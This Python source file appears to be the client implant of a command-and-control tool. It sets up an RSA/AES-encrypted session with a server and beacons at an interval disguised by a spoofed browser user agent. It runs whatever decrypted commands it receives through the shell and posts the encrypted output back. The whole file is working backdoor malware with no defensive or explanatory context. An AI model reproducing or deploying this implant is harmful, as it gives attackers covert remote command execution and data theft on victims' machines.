from CryptoLib import CryptoLib
import requests, subprocess, time, os, json


KEEPALIVE = "1"
ENTRYPOINT_BEACON = ""
ENTRYPOINT_RESPONSE = ""
server = "http://127.0.0.1"
port = "8080"
id = -1
encoding = "shift-jis"
user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
cryptolib = CryptoLib()


def execute(command):
    if command == "KILL":
        os._exit(0)
    try:
        pipe = subprocess.run(command.split(" "), shell=True, encoding=encoding, stdout=subprocess.PIPE)
        ret = pipe.stdout
    except Exception:
        ret = "runtime error"
    encrypted_message = cryptolib.encrypt_aes(ret)
    url = "%s:%s/%s/" % (server, port, ENTRYPOINT_RESPONSE)
    headers = {"User-Agent": user_agent}
    requests.post(url, headers=headers, data=encrypted_message)


def beacon():
    url = "%s:%s/%s/" % (server, port, ENTRYPOINT_BEACON)
    headers = {"User-Agent": user_agent}
    res = requests.get(url, headers=headers)
    if res.status_code == 200:
        decrypted_message = cryptolib.decrypt_aes(res.text)
        if decrypted_message != "":
            execute(decrypted_message)


def init():
    global ENTRYPOINT_BEACON, ENTRYPOINT_RESPONSE, KEEPALIVE
    cryptolib.init_aes()
    iv = cryptolib.get_aes_iv()
    key = cryptolib.get_aes_key()
    profile = json.dumps({"iv":iv, "key":key})
    encrypted_profile = cryptolib.encrypt_rsa(profile)
    headers = {"Cookie": encrypted_profile, "User-Agent": user_agent}
    res = requests.post("%s:%s/" % (server, port), headers=headers)
    profile = json.loads(cryptolib.decrypt_aes(res.text))
    ENTRYPOINT_BEACON = profile["beacon"]
    ENTRYPOINT_RESPONSE = profile["response"]
    KEEPALIVE = profile["keepalive"]


if __name__ == "__main__":
    init()
    while True:
        beacon()
        time.sleep(int(KEEPALIVE))